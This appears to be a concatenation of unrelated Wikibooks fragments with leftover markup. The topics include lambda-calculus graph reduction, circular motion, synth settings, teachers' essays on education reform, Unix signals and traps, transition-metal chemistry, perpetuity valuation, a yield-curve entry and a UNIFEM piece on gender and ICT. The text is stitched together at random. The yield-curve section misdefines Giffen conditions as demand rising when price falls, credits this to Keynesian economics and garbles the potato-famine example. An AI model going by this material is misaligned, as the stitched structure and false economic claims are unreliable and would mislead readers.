:Yes, pretty much. Apparently, this wikibook section is not written yet, the todo notes just track what I have in mind for it. The notes are based on SPJ's book [http://research.microsoft.com/%7Esimonpj/Papers/slpj%2Dbook%2D1987] chapter 13, in particular 13.2.1.
The question arises since I've read in http://www.cl.cam.ac.uk/teaching/Lectures/founds-fp/Founds-FP.ps.gz (lecture notes of a Cambridge course) about the work of David Turner (also mentioned in the above wikipedia article), who used them to implement graph reduction. The naive approach exposed in the article does not work well because the graph representing a function may be shared, so you must either copy the graph before starting reductions, or use combinators (I've not yet fully understood the solution).
:It's actually fairly simple. For evaluating something like &lt;code&gt;(&amp;lambda;x.(x+1)+2)5&lt;/code&gt;, there are several options:
:*Copy the body &lt;code&gt;((x+1)+2)&lt;/code&gt; and replace every occurrence of x with 5.
:*Evaluate the body &lt;code&gt;((x+1)+2)&lt;/code&gt; while keeping in mind that &lt;code&gt;x=5&lt;/code&gt; (environment).
:*Defer the &quot;keep in mind&quot; part to the lambda expression, i.e. use (super-)combinators which looks like &lt;code&gt;(&amp;lambda;x.(&amp;lambda;x.x+1)x+2)5&lt;/code&gt;. In other words, instead of storing expressions as &lt;code&gt;expr where I kept in mind that x=5&lt;/code&gt;, store them as &lt;code&gt;(&amp;lambda;x.expr)5&lt;/code&gt;. This is pretty neat and thus that's how ghc and others do it.
:Btw, thanks for your lecture notes, I think they make a very good reference concerning lambda calculus for the wikibook.

      <text xml:space="preserve">'''Uniform circular motion''' describes a body which is following a circular path at a constant speed. For M2 you will only need to consider this where the circular path is horizontal.

Angular velocity is the rate at which a body turns through an angle. It is therefore defined as change in angle/time taken. If a body travels on a circular path, and turns through one revolution per second, its angular velocity is (2π radians) divided by (1 second), so its angular velocity is 2π rad/s.

The usual symbol for angular velocity is ω (a lower-case omega).
The body's &quot;tangential speed&quot; and angular velocity are related by the equation v = rω, where v is in m/s and r is the radius of the circle (in m).

      <text xml:space="preserve">== How to insert a Hold Switch into a synth ==

Sometimes, it is useful to hold a note or chord indefinitely without continuously holding down keys or pushing the sustain pedal. You can achieve that with a hold switch that can be implemented as follows:

1. insert a button at the instrument level (toggle type, range 0-1)

2. assign it to MIDI controller 66 (no connections are necessary)


'''Notes'''

- make sure that the instrument properties allow for a hold control, and that it is assigned to cc #66

- check if the button's MIDI in is activated

- don't copy + paste the button from another instrument, it won't work!!

      <text xml:space="preserve">== How to implement a generic aftertouch ==


1. insert a Channel AT or Poly AT module into your instrument

2. insert a IC Send module, connect it to the AT module you just created

3. switch the IC Send module to &quot;Always Active&quot;

4. switch the IC Send module to &quot;Visible&quot;


'''Notes'''

The IC Send module gives you a list where to route the aftertouch to. From this list, you can select an arbitrary controller to receive the aftertouch signals. Note, however, that AT signals normally range from 0 to 1 and thus may have to be adjusted to appropriately control a specific parameter of your instrument that has a different range.

      <text xml:space="preserve">==1. Ethics in Education==

I personally feel that teaching students ethics is one of the most important lessons we deliver.  After all, how much of our core curriculum will our students actually remember in five years? ten years?  What they will remember is what we teach them about empathy, social responsibility, and morality.  No matter what future career our students pursue, ethics will play a role.  All educational endeavors should address ethics.  Ethics is cross-curricular.  Imagine exploring global warming in science with a perspect on the effects of global warming in China.  Through this lesson the students can learn about the agriculture of China, the livelihood of the Chinese, and develop empathy for those who may be affected.  In addition to science, the students are learning geography and economics.  Including debates and discussions on these global topics also fosters communication skills, student discourse, and collaboration.  Perhaps the English teachers can have the students write to some of the farmers to learn about their personal lives.  Teachers need to be taught how to bring ethical issues into core curriculum.  According to Mathew White (IB,2007), the true strength of an ethical education is that it can act as the foundation for peace.  Sadly, many students are not taught ethics at home and the responsibility falls solely on the educational system.  Perhaps the events that unfolded at Virgina Tech could have been prevented if the individual who committed such horrible acts had been taught to be ethical in his decisions.

I feel that a great way to bring ethics into the educational system is the requirement of community service hours.  Through community service students learn about the plight of others.  In addition, they gain the satisfaction of helping others.  Serving others teaches empathy, concern, and social responsibility.  The quote below is included because I wanted to point out the importance of the teacher modeling ethical behavior.  Included in this behavior is a love for his/her students that should be shown each day.  

&lt;table WIDTH=&quot;60%&quot; ALIGN=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #FFF7F7;
border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt;&quot;Too often we under-estimate the power of a touch, a smile, a kind word, a listening ear, an honest compliment, or the smallest act of caring, all of which have the potential to turn a life around. -- Dr. Felice Leonardo Buscaglia&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

==2.  Multicultural Education==

This topic blends well with my number one choice, ethics.  Teaching multiculturalism allows students to see that the world is full of variety.  This variety goes beyond skin color to include religious beliefs, social organization, political beliefs, and cultures.  By investigating and learning about others, students begin to see the bigger picture of their existance.  When students are isolated from multicultural experiences, they begin to feel that their way of life is the only way of life.  This leads them to the thought of their way of life being the only acceptable way of life.  Multicultural education also reinforces ethical education.  Respect for others is a vital trait that every human must possess. With our world becoming more and more interconnected, multicultural education becomes even more important.  Many of our students will be entering a work force that consists of diverse individuals from all walks of life.  They must be able to not only understand other cultures, but be accepting of them as well.  How can students who lack multicultural education perform in a multicultural world?  

==3.The Digital Divide: The various issues that surround access to technology have a major impact on the extent to which and ways in which technology can be effectively employed in today’s educational system in American and beyond.==

Teaching todays &quot;digital natives&quot; requires traditional teaching styles to change.  The traditional lecture centered classroom will quickly disengage the new digital native learner.  Digital natives are used to having information fast, interacting with that information, and being able to manipulate information.  Traditional teachers must take on authentic teaching styles.  They must engage the students in activities that work with the way their minds have been molded.  Incorporating technology in their delivery is vital.  There are so many ways to do this - power point (not a big fan, but better than overhead transparencies), internet searches, email buddies, electronic presentations, wikibooks, digital games, and bloggs are all ways of delivering material that will stimulate the digital native.   The best digital presentations are those that are interactive and allow the student to manipulate material.  

Reaching the digital native does not simply require the use of technology.  Their brains can not absorb material that is presented in traditional lecture style alone.  They need lessons that are interactive, constructivist in nature, and involve manipulative skills.  Laboratory designs, debates, discussions, simulations, and demonstrations are all effective in engaging the digital native.  Using differentiated lesson styles keeps the digital native engaged in the lessons.

As a final note, I think that the education of teachers on how to use technology effectively in the classroom is vital.  This class has taught me more about technology than any other class I have taken.  The use of wikibooks has enlightened me to new ways of incorporating technology in my classroom.  I have shared my learning with other teachers in my school and found them to be eager to learn more.  My students enjoyed the process of using wikibook and were amazed at my level of knowledge.  It was the first time that I, a digital immigrant, was able to teach them, digital natives, a new technology skill.  Also, as a side note I really love elgoog.

==4. Maximizing the Effectiveness of Dialogue: Effectively using conversation in Education.==

Dialogue in education seems to mainly be that of the teacher dispensing material and the students asking the questions.  This is not effective.  Students and teachers should be asking the questions and discussing the answers together.  It is a myth that lecture does not lend itself to inquiry.  I believe that lecture has its place in education, but it is the delivery method of the lecture material that must change.  By actively engaging students in discourse throughout a lecture, having them come up with their own ideas based on the lecture, and debating lecture material, the teacher can bring effective dialogue into the classroom.  According to the National Science Standards students learn through discourse.  Verbalization of ideas allows students to self-analyze their thoughts, and modify their beliefs by hearing those of others.  This brings collaboration and team work into the classroom - two skills that will be vital to the success of students regardless of their career choices.

Another area of change that is needed is the level of dialogue between teachers at all grade levels.  Often teachers become isolated in their individual classrooms, schools, and divisions.  There is much that can be gained through teacher discourse on educational practices.  I have found that just being in this class with teachers from different school districts has given me new insights into education that I previously did not possess.  Through discourse and collaboration with other teachers great things can be accomplished.  Hopefully we will set up a Second Life and continue our dialogue.  However, it is ironic that we need another dimension to communicate in when we often fail to communicate in the real one.

==5. The student as teacher and the teacher as learner.==

Following up on my number 4 choice, this issue is very important.  Many teachers feel that they must have all the answers to any question the students come up with.  Many students believe that the teacher knows everything.  These two attitudes must change.  Teachers need to be comfortable letting students know that they often do not know the answer to their questions. Then the teacher can foster collaboration with the learning process through teacher-student investigation. 
In addition, when presenting material, the teacher needs to be open to allowing the students to come up with their own questions.  The teacher can guide the students to acceptable questions while allowing the students to take ownership of their investigations.  Guiding them to acceptable questions allows the teacher to make sure the standards are being investigated so the students can still be successful on the SOL's or other standardized tests.  My argument for student-directed learning is that the student will learn the material much deeper if he/she is involved in the creation of the learning process.  This makes the student much more interested in finding the answers.

      <text xml:space="preserve">==Accountability==
Accountability is not going to go away. Nor should it. As an educator, I believe in accountability, but under the present, standards-based accountability system, linked to high stakes testing, it seems that schools are destined to fail.  No Child Left Behind has raised a number of issues while creating a climate of anxiety and discontent within our schools. Accountability should be a tool that promotes growth and improvements in the education system, and though I believe the initial intent of NCLB was precisely that, I do not believe that it is turning out that way. My experience is that NCLB is hindering, more than helping, student learning. With the pressure on schools to “make the scores,” teachers are implementing instructional strategies that ignore what they know about best practices and how children learn. Important content areas such as science and social studies are less apt to be taught, while the arts are barely in the picture. In addition, our best and brightest teachers are leaving the profession often out of frustration with an impossible job. Accountability is multifaceted and American schools are in desperate need of a system that promotes collaborative learning communities that develop in students the shills they need for the 21st century. Until we resolve the accountability issues, I feel that our entire educational system is in danger. For this reason, accountability is my number one change issue. Many of the other change issues we have discussed fall under the umbrella of accountability. With the intense pressures on teachers for test scores, Web 2.0 and current technologies that our digital natives have at their disposal are viewed as interruptions of, rather than tools for, education. With high stakes testing, many teachers feel too overwhelmed to explore these new tools with their students. Curriculum, instructional materials, and pedagogy tend to reflect the accountability system; teachers will go with whatever gets the best test results. Isolation prevails as well as a result of the current accountability system. Teachers feel isolated from the parents and communities as they are called into question when school report cards are published. In a sense, the general public becomes the enemy. Teachers are often placed at odds when one another when a school “fails” due to the test scores of one or two teachers. And schools work against schools as they compare test results. In North Carolina, teachers receive monetary rewards when their school meets their testing goals. There are hard feelings when one school, that serves predominantly white middle class kids, always makes their goals. Each teacher gets a fat check for $1500.00 while teachers serving schools in poorer minority neighborhoods get nothing but a bad name in the local paper. We need schools that work together, teachers that support one another, and communities that are truly learning communities. The right accountability system is the first step to getting our schools on the right track.

==Teachers as Learners, Learners as Teachers==
I love learning and I feel that it is the single most important thing about me as teacher. I do not believe that any teacher can be effective if he or she is not also a learner. The notion of the teacher as the imparter of knowledge and the student as the recipient is outdated. Many, many teachers, however, still fit this stereotype; which is why this is one of my top five issues. It is my belief that this is a critical change issue that must be addressed before effective reform of any kind can take place in today’s schools. In order for teachers to be effective in today’s classroom, where abundant knowledge is accessible with the click of a mouse, teachers and students must become collaborators within a learning community; a community which extends well beyond the walls of the classroom. An increasingly important role for teachers is that they must be models for the practice of learning.

==Reform in Reality==
Most would agree that education reform is sadly needed. What is not agreed upon is how that reform should look or how it should take place. There are many reform proposals all containing pros and cons. What we are currently stuck with is a system of high stakes testing promoted by No Child Left Behind.  Most teachers would agree that NCLB has more cons than pros and yet they feel powerless to change what is mandated.  While teachers feel they lack a voice in true education reform, there are things they can do, within the education structure that currently exists, to foster the competencies that students need to function effectively in a flat world. Though teachers may feel restricted by state standards and high stakes testing, they are not powerless. Standards cannot be ignored and therefore teachers must understand their strengths and address their weaknesses.  Standards are not “the curriculum,” but rather are intended to be a framework for the design and development of the curriculum. Although many teachers may know the standards for their grade level and subject area, very few know and understand the standards across grade levels and subject areas. That is a good place for teachers to start. In general, however, standards tend to lack cross disciplinary coherence. Teachers must look for the ‘conceptual lens’ through which the curriculum might be taught. Teachers could work collaboratively to identify the major concepts and enduring understandings at each grade level. It is critical that we teach concepts rather than facts. By teaching concepts, the necessary facts will be included. For example, when teaching the water cycle, one should also address current real-world issues such as how the water cycle is impacted by deforestation or by the damming of rivers. How does that impact the way people live and the way communities, states, and nations interact? It is critical that students are exposed to concepts that cross disciplines and have relevance, meaning, and authenticity. Teachers must ensure that learning, not testing, is the goal. They are the only ones in a position to do so. While I believe that teachers must unite and become proactive on issues of education reform, the most realistic, and immediate thing they can do is to change what happens in their own classroom. Each of us has that power.

==Web 2.0 (as a classroom tool and a tool to connect parents and community)==
Web 2.0 has had a drastic impact on journalism, politics, and business and has the potential to affect education in equally powerful ways. Web 2.0 presents an awesome set of tools for teaching and learning. Kids are using new technologies that their teachers are often completely unaware of. We can fight the growing technologies, as many teachers do, or we can embrace them, explore them, and use them to our advantage.  Web 2.0 provides opportunities for students to collaborate and share ideas and contribute to other students learning. Here on the read/write web, the lines between teacher and learner blur. The National Technology Plan released in 2005 states, “Today’s students, of almost any age, are far ahead of their teachers in computer literacy.” With the advent of Web 2.0, we must rethink the way we deliver curriculum as well as our expectations for students. Blogs, wikis, and podcasts are easy to use web tools that have the potential to be very powerful when used effectively in the school setting and forces us to rethink our ideas about curriculum, literacy, and the way students think and learn. Not only does Web 2.0 have potential to directly impact the teaching-learning process in classroom, but it also has great potential as a tool to communicate with parents and involve them in the teaching learning process. A Weblog can become a portal to the classroom that keeps parents informed and connected. Podcasts can provide educational material that parents can use to review and reinforce important concepts with their children at home. The possibilities are endless. As teachers concerned with improving the teaching learning environment we would be amiss if we did not utilize these tools.

==Kids and Nature==
As my final ‘top five,’ I feel compelled to add, even at this late date, yet another change issue that seems rather far removed from the ones we’ve discussed so far. While this is an issue that has long been a concern of mine, for whatever reason, it didn’t come to mind throughout this course as a change issue. In a conversation with a friend yesterday, she mentioned a book that she knew would interest me - Last Child in the Woods: Saving Our Children from Nature Deficit Disorder by Richard Louv – and it suddenly occurred to me that this is a huge change issue. Children of the digital age have become increasingly alienated from the natural world, and according to Louv (2005), with disastrous implications, not only for their physical fitness, but also for their long-term mental and spiritual heath. Kids who play outside on nature’s playgrounds (trees, fields, streams, woods) are more creative and inventive, and more likely to play cooperatively. While the elementary school curricula is full of information and references to nature, how often do we actually get kids out to experience it first hand. They read about the world’s biomes and probably visit virtual habitats on-line. But how many of those children have ever stood quietly in the woods listening to the trees, or waded in a stream, or turned over a rock to see what’s underneath? How do we instill in our children the essential need to be stewards of the environment when they are so disconnected from the natural world?

border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt;“Unlike television, nature does not steal time, it amplifies it. Nature offers healing for a child living in a destructive family or neighborhood. It serves as a blank slate upon which a child draws and reinterprets the culture’s fantasies. Nature inspires creativity in a child by demanding visualization and the full use of the senses. Given a chance, a child will bring the confusion of the world to the woods, wash it in the creek, turn it over to see what lives on the unseen side of that confusion.” (Louv, 2005)&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

Have you seen [[Electronics/Component Identification]] ?
You are welcome to use the text and pictures in that chapter for the &quot;[[PCB Components for dummies]]&quot; book.

However, I hope that you can help us improve the &quot;Component Identification&quot; chapter.
I hope that, with your help, that chapter will have pictures and plain text that is so easy to read that there would be no need for a separate &quot;PCB Components for dummies&quot; book.

The '''Hunter's bend''' (aka '''Rigger's bend''') is used to join two lines. It consists of interlocking overhand knots, and can jam under moderate strain. 

Hunter's bend is one of the most recent knots to be discovered. It appeared on the front page of ''The Times'' in 1978 and was credited to Dr. Edward Hunter. Dr. Hunter used it for years to tie broken shoelaces before discovering its originality through a friend in the 1970s.  When it appeared on the front page, it led to much publicity for the knot and also to the foundation of the International Guild of Knot Tyers. However, the knot was presented in '''''Knots for Mountaineering''''' by Phil Smith ca. 1956.

      <text xml:space="preserve">===Teaching social skills/manners/ethics in the classroom===
I feel that we need to start emphasizing other aspects related to life in our schools (other than academics).  Schools today are so focused on the standardized tests, that we have completely abandoned the role of teaching our students key skills that they will need after they graduate.  If our students do not have social skills, manners, or ethical standards, they cannot possibly survive in our ''flat'' world.  Many teachers feel that it is the parent's job to teach these critical skills to their children.  However, in today's society, teachers often spend more time with their students in a given week than parents spend with their own children.  Due to this, I feel that it is the responsibility of the schools to take ownership over these areas and teach them to every student.  This is not something that should only be looked at in the early grades.  Teachers at every grade, PK-12, should nurture these skills so that by the time our students graduate, they are well rounded individuals who will be able to succeed in life.  Perhaps there should be a curriculum designed to support these aspects.  It does not have to be detailed, but maybe it should contain certain components that should be stressed at each grade.  I don't know if this is the way to go, but something needs to be done.

===The Future of Accountability? -- Dumbing down the test? Incentives for Passing?/Tests geared toward low level learning.===
In theory, NCLB is a great reform proposal.  Who doesn't want every child in our country to succeed academically?  The problem is that it is not possible for 100% of students in our public schools to pass these state standardized tests.  While I agree it is a fantastic goal to have, requiring that the pass rate be 100% by 2014 is unrealisitic.  Since there are penalties for not meeting AYP, something is going to have to be done to ''help'' our students pass.  The only way to meet these continuously stringent goals, in my opinion, is for the tests to be dumbed down so that more students can pass it.  This is a big problem.  What is the point of having '''standardized''' tests that are dumbed down?  If this is what the future holds, then accountability is really just a big joke.  

Another problem with the state standardized tests is that they are not assessing the types of learning that we would like our students to achieve.  The tests are not testing students on their ability to problem solve, evaluate information, or synthesize information.  Instead, they are mostly assessing the student's ability to recall information, comprehend information, and sometimes apply what is given.  While I understand that these multiple choice tests are the easiest to give and grade (and therefore the cheapest), we are doing a disservice to our students by not only giving them tests that are asking them to regurgitate information but also by teaching to these low level tests.

===Digital Divide===
Before this class, I had never really thought about this topic; however, in today's society, this is a huge issue in education.  Our students are digital natives who are used to using technology for most aspects of their lives.  Everything is at their fingertips and they are used to using technology for everything they need.  This is a huge problem since our schools and teachers are not equipped to deal with this type of student.  We expect them to sit at desks for extended periods of time, listen to the teacher lecture about a topic that he or she is an &quot;expert&quot; on, read from textbooks, and handwrite tests and essays.  While it is important for students understand that all of these are important at some point, this is not the way that these students enjoy learning.  In today's society, students could (and should) be researching and writing papers collaboratively online, learning how to evaluate online sources, and using the latest technology to enhance their learning.  The only way that this can happen is for educators to realize the importance of staying current with the latest technology.  This is not happening in our current schools!  Even our technology specialists are way behind.  We need to do something soon, or we are going to get so far behind the curve that we will never catch up.

===Education Reform===
In the United States, with education being on the political agenda, there seems to be a new reform proposal implemented with each incoming president.  While I commend their efforts for trying to ''fix'' our education system, they are doing so in the wrong way.  For one, they need to allow a given reform to stay in place for more than four to eight years.  How can we really know if something is effective if we don't leave it in place long enough to effectively evaluate it.  Second, educators need to have a say in how our schools should be reformed.  Educators are the individuals who are in the classrooms and really know what works and what doesn't work.  They also would be more willing to implement something if they felt committed to it.  Third, the US needs to reevaluate the importance of education and reproportion the amount of money that is allotted toward it.  We cannot change our schools for the better if we do not increase funding.  Just like Allen and Cosby said in their book, American Schools:  The Billion Dollar Challenge, we need to treat education as a matter of national security.  If we don't effectively change our schools, the next generation will not be able to successfully compete our ''flat'' world.

===Moving up the Food Chain: Become comfortable with questioning our own / the system’s assumptions and traditions about the way education should work.===
We need to be comfortable questioning not only the educational system but also our own assumptions about it.  Our education system is old and outdated.  Just because we have been doing something a certain way for 100 years does not mean that we should continue doing it that way.  Whose to say that it was ever effective?  Educators need to not only question their own viewpoints, but they need to challenge others to question their own as well.  Most individuals (especially those not in education) do not realize how ineffective some of our traditional teaching practices are.  They think that since they learned a certain way and they turned out good, that that particular way is the best way.  Trying to get these individuals to understand that our way is not effective is definitely a challenge, but it can be done.  To start, we need to challenge all educators to really question their own assumptions about education.  From there, the rest of society's assumptions can be challenged as well.

      <text xml:space="preserve">=== Signals ===
Signals are software interrupts that notify processes that some condition or event has occurred. Examples of events that generate signals are:

* a process attempts a divide by zero
* a user presses the INTERRUPT key at the terminal
* a process sends another process a signal with the kill  command of the kill function

A list of all the different signals can be displayed using
&lt;pre&gt;
$ kill -l
&lt;/pre&gt;

The '''kill''' command can also be used to send signals 
to other processes. Start a background process that sleeps for
1000 seconds:
&lt;pre&gt;
$ sleep 1000 &amp;
[1]     14936
$ ps
   PID TTY      TIME CMD
 14936 pts/7    0:00 sleep
 12203 pts/7    0:01 bash
&lt;/pre&gt;

Note that the process id will (most likely) be different
when you run it.
The command-line below sends the '''SIGKILL''' signal to 
process 14936 (in this case):
&lt;pre&gt;
$ kill -KILL 14936
$ ps
   PID TTY      TIME CMD
 12203 pts/7    0:01 ksh
[1] + Killed                   sleep 1000 &amp;
&lt;/pre&gt;

Upon receiving the '''SIGKILL''' signal the 
'''sleep''' process terminates. 

=== Traps ===
Processes can respond to signals in three different ways:

* perform the default action
* ignore the signal. 
* execute a specified function (called a signal handler)

The default action performed by a process when it receives a signal depends on the signal type. Most (like '''SIGKILL''') 
cause the process to terminate. Others like '''SIGQUIT''' 
cause the process to terminate and generate a core dump:
&lt;pre&gt;
$ sleep 1000 &amp;
[1]     14950
$ kill -QUIT 14950
$ ps
   PID TTY      TIME CMD
 12203 pts/7    0:01 bash
[1] + Quit(coredump)           sleep 1000 &amp;
$ ls core
core
&lt;/pre&gt;
Core files can be large so delete it:
&lt;pre&gt;
$ rm core
&lt;/pre&gt;

Signals can be caught using the trap command. 
Create the following shell script in the file 
'''catch_signal.sh''':
&lt;pre&gt;
#!/bin/bash
trap 'echo &quot;GOTCHA!&quot;' INT KILL
while :
do sleep 10
done
&lt;/pre&gt;

Run '''catch_signal.sh''' in background:
&lt;pre&gt;
$ catch_signal.sh &amp;
[1]     15053
$ kill -INT 15053
$ GOTCHA!
&lt;/pre&gt;
The signal was caught and instead of terminating 
(which is the default action for '''SIGINT''') 
the message &quot;GOTCHA!&quot; was echoed to standard output.

Some signals however ''can't'' be caught, '''SIGKILL'''
for example:
&lt;pre&gt;
$ kill -KILL 15053
[1] + Killed                   catch_signal &amp;
&lt;/pre&gt;

Run '''catch_signal.sh'''; in foreground:
&lt;pre&gt;
$ catch_signal
&lt;/pre&gt;

Hit the interrupt key (control-C usually):
&lt;pre&gt;
^CGOTCHA!
&lt;/pre&gt;

Now hit the quit key:
&lt;pre&gt;
^\catch_signal[3]: 15102 Quit(coredump)
$ ls core # will have generated a core file
core
&lt;/pre&gt;

=== Nohup ===
Commands run with '''nohup''' do not terminate when 
the user logs off.

Create the script in the file '''dont_hangup.sh''' and
make it executable:
&lt;pre&gt;
#!/bin/bash

while :
do
    date
    sleep 100
done
&lt;/pre&gt;

Run it in background preceded by the command '''nohup''':
&lt;pre&gt;
$ nohup dont_hangup.sh &amp;
[1]     15224
Sending output to nohup.out
&lt;/pre&gt;

Check its running:
id (12203 in this case):
&lt;pre&gt;
$ ps -fu aholt
aholt 15224 12203 pts/7  sh ./dont_hangup.sh
aholt 15232 15224 pts/7  sleep 100
&lt;/pre&gt;

Make a note of the parent process id (12203 in this case)
of &quot;dont_hangup&quot; and the terminal device and log out of 
your session.

Log back in again. See that '''dont_hangup.sh''' is
still running:
&lt;pre&gt;
$ ps -fu aholt
aholt 15224      1 ? 0:00 sh ./dont_hangup.sh
aholt 15237 15224  ? 0:00 sleep 100
&lt;/pre&gt;

While &quot;dont_hangup.sh&quot; is still running, its parent process 
has changed. The process id of the parent is 1 
(not 12203 as before) and it is no longer associated 
with a terminal device.  Using '''nohup''' is equivalent to 
''ignoring'' the SIGHUP, that is:
&lt;pre&gt;
trap '' HUP
&lt;/pre&gt;

      <text xml:space="preserve">== Period 3 transition metals ==
All these elements have electron configurations that begin 1s&lt;sup&gt;2&lt;/sup&gt; 2s&lt;sup&gt;2&lt;/sup&gt; 2p&lt;sup&gt;6&lt;/sup&gt; 3s&lt;sup&gt;2&lt;/sup&gt; 3p&lt;sup&gt;6&lt;/sup&gt; but they have different 3d and 4s subshells. 1s&lt;sup&gt;2&lt;/sup&gt; 2s&lt;sup&gt;2&lt;/sup&gt; 2p&lt;sup&gt;6&lt;/sup&gt; 3s&lt;sup&gt;2&lt;/sup&gt; 3p&lt;sup&gt;6&lt;/sup&gt; is the electronic configuration of argon, so instead of writing this out over and over again, it's neater to write [Ar], which means the same thing.

All these d-block metals follow the same pattern, with the 4s subshell filled and the 3d subshell filling, '''except''' Cr and Cu which are 4s&lt;sup&gt;1&lt;/sup&gt; in order to allow a half-full and full 3d subshell, respectively. The exception for chromium and copper occurs because a half-full or full 3d subshell is lower in energy than expected, probably due to a quantum mechanical effect.

=== Transition metal ions ===
The electronic configurations of transition metal ions can seem counter-intuitive. For neutral transition metal atoms, the 4s subshell fills first, followed by the 3d subshell, which we assume is because 3d is slightly higher in energy than 4s.

However, in transition metal ions, the 4s empties first, which implies that it is higher in energy than the 3d. So which is higher in energy, 3d or 4s? The answer is they are very close in energy, and changing from a neutral atom to an ion causes the 3d to decrease in energy relative to the 4s, meaning that '''in ions, the 4s empties first''', whereas '''in neutral atoms, the 4s fills first'''.

----

The bug must move seven times to the right and seven times up.  Any such sequence, e.g. RRUUURURRUURUR is a valid path.  Therefore the solution is &lt;math&gt;{14 \choose 7} = 3432&lt;/math&gt;.
In the case of an &lt;math&gt;n&lt;/math&gt; x &lt;math&gt;n&lt;/math&gt; board the answer is &lt;math&gt;{2n-2 \choose n-1}&lt;/math&gt;.

      <text xml:space="preserve">The &quot;Yield curve&quot; plots the yield (return) of a financial instrument [e.g. bond] as a function of time.  Usually, the yield curve has an &quot;S&quot; shape and sometimes refered to as the &quot;S curve&quot; (which helps junior students to remember its shape).  This emphasizes two characteristics, namely as time increases, diminishing returns sets in, indicated by the asympotic shape.  The other influencing factor is that the curve is monotonically non-decreasing, indicating that one expects a better return on an investment the longer the investment is held [under non-Giffen market conditions].  
Given that consumers behave rationally and that there are no other influencing factors, the yield curve reflects the status that consumers prefer to get a better return on an investment.  If the curve was not increasing, then a consumer is expected to pull out his money at the peak and then reinvest at some later time.

According to Keynesian economics, a &quot;Giffen market condition&quot; is one in which demand increases as price decreases and interest rates are positive.  Historically, there are times when this supply-demand curve was not followed, e.g. during the Irish potatoe famine.  During that time, prices of potatoes went up as the demand decreased.  However, there were many government induced factors in the economy going on during those times.  
A negative interest rates implies that one would get less money back at the return than at the time of the investment.

      <text xml:space="preserve">A &quot;perpetuity&quot; is a theoretical bond which makes payment during its entire life.  One realizable example of this is a company issued stock which always pays dividends each year.  The lifetime is defined from the time of issuance until buy back or potential bankruptcy.

A perpetuity, such as preferred stock, can be valued by simply dividing the payment by the applicable discount rate.

PV&lt;sub&gt;Perpetuity&lt;/sub&gt; = &lt;math&gt;\frac{C}{r}&lt;/math&gt;

Example:

XYZ Corp. preferred stock  pays a $2 dividend every year. This dividend is expected to remain constant for the forseeable future. If investors are requiring a 10% return, what is the stock selling for?

&lt;math&gt;PV = \frac{$2}{.10}=$20&lt;/math&gt;

Therefore, XYZ Co. stock should sell for $20 per share.

== Growing Perpetuities ==

A growing perpetuity is one whose payments increase at a certain rate forever. They can be valued by the following formula, where C&lt;sub&gt;1&lt;/sub&gt; is the payment during the ''upcoming'' payment period, r is the discount rate, and g is the growth rate:

PV&lt;sub&gt;Growing Perpetuity&lt;/sub&gt; = &lt;math&gt;\frac{C}{r-g}&lt;/math&gt;

Example:

Madeline and Thurgood Johnson wish to set up a trust fund for their grandson which will begin paying $5,000 next year. They wish to have the payments grow at 5% per year to keep pace with inflation. If the current discount rate is 8%, what should they pay for the perpetuity?


PV&lt;sub&gt;Growing Perpetuity&lt;/sub&gt; = &lt;math&gt;\frac{$5,000}{.08-.05} = $166,666.67&lt;/math&gt;

=== Creating a course ===
Hey,

I would like to help you develop a real course here that people can use to learn Mohawk. I have a lot of experience as a lesson developer, but I don't know much Mohawk at all, so I would just guide you through the process, discussing what phrases or grammar to introduce, what kind of exercises would make sense, which explanations are hard to understand for a beginner and the like. I would really like to learn more Mohawk as I'm visiting Kahnawake in October. Thanks for adding these resources!

      <text xml:space="preserve">In the 1970s, Vector based computer graphics was commonly used to display lines, text, and symbols on a CRT.  Even though terminals have mostly fallen out of use, the concepts of vector based displays are inherently present in most computer graphics APIs, e.g., DirectX, AutoCad dwg and post-script.  The idea is that the designer specifies the line segments to be drawn in the output space [screen], freeing him or her to think about drawing fundamental geometric primitives and turning over the conversion of the vector to a raster image to the API.

A further extension of this idea is think about 3D parts in space and time as well as the feature history and level of detail.  A 3D part is oriented in space and its corresponding 2D projection is calculated as a collection of 2D vectors.  This leads to the fundamental idea of CAD/CAM. Common CAD/CAM interchange standards are [http://www.fileinfo.com/extension/iges IGES] and [[/STEP/]].

      <text xml:space="preserve">{{Gender and ICT}}

Two decades ago, at the Third UN World Conference on Women in Nairobi, we realized the potential of
the new Information and Communication Technologies (ICTs) to advance gender equality and women’s
empowerment. A decade later, we realized what it would take. A genuine Information Society demands
the equitable participation of all members of society in the creation, management and use of its products. Without this, the notion remains an empty promise.

UNIFEM has worked for over a decade to help make the promise a reality for women. It is true that some women can use technology to access new markets, to access information and to compete on more equal terms with men. In countries or communities where strict cultural norms and traditions isolate women in their homes, for example the Internet has greatly facilitated their access to knowledge information. But technology is never neutral. It cannot by itself change the power structures that are deeply embedded in society. While the Internet has been a powerful tool for global advocacy for ending violence against women and other human rights abuses, for example, it has also served to facilitate the dramatic increase in sex tourism and trafficking in women and girls.

The constraints to women’s access to and control over ICTs are by now well known. Despite advances that have reduced prices for computers and connectivity in many regions, they are still beyond the reach of most women worldwide. Telecommunications infrastructure is largely urban centred, Internet content is still primarily in English and online use of some languages has been constrained by technical design. Women have less time to use computers, email or the Internet regularly. Similarly, the unequal  participation of women in decision-making, and their lack of needed skills and training factor into the gender gap in ICT policy and design. 

So long as women are viewed solely as consumers of ICTs, they will never be able to fully participate in their benefits. Enabling women to realize these benefits means building their capacity not only to access technologies, but also to participate in their design, influence their content and shape their uses. Women are producers as well as consumers of information and knowledge. Women must also participate in shaping the regulatory environment that surrounds content and use. Without such an environment the digital divide will remain – between rich and poor, between those with the advanced education and skills and those without, and between women and men. But we also need to ask to what extent women are involved in, and gender issues addressed in the shaping of regulations – with regard to both content and use.

UNIFEM is supporting the development of websites, virtual communities and networks and CD-ROMS
on such issues as gender and trade, ending violence against women, and women’s human rights, as well
as region-specific initiatives such as Arab Women Connect, which offers web-based information spaces
in Arabic and English. We are currently partnering with Cisco Corporation in Jordan in the creation of e-villages, which is building the capacity of rural women to secure jobs in the new economy. Our Digital Diaspora initiative in Africa is harnessing the technical know-how and business expertise of entrepreneurs in the diaspora to women’s organizations and business associations in Africa to strengthen women’s economic security through training in ICTs, the creation of business partnerships and access to finance. In India we have set up a web-based centre for journalists on gender and HIV/AIDS, and in South Asia and Africa we are supporting networks of HIV positive women by linking them through an online resource centre.

